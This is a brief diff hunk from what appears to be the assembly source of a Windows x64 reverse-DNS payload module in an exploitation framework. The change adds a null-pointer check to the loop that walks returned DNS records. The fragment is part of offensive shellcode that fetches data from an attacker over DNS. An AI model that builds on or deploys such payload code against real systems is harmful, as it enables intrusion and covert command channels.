@@ -271,10 +271,11 @@ module Payload::Windows::ReverseDns_x64
          mov         rsi, rsp              ; pointer to DNS_RECORD 
          mov         [rsi], rax            ; ESI < -pointer to DNS_RECORD
       next_iph:
-         mov         rbx, [rsi]            ; EBX < -current pointer
-         mov         rdx, [rbx]
-         mov         [rsi], rdx            ; save Next IP
-         mov         rdx, rbx  
+         mov         rdx, [rsi]            ; RDX < -current pointer
+         test        rdx, rdx
+         je          parse_end_b
+         mov         rbx, [rdx]
+         mov         [rsi], rbx            ; save Next IP  
          movzx       eax, word ptr [rdx + 0x10]   
          cmp         eax, #{request_type}
          jne         next_iph 
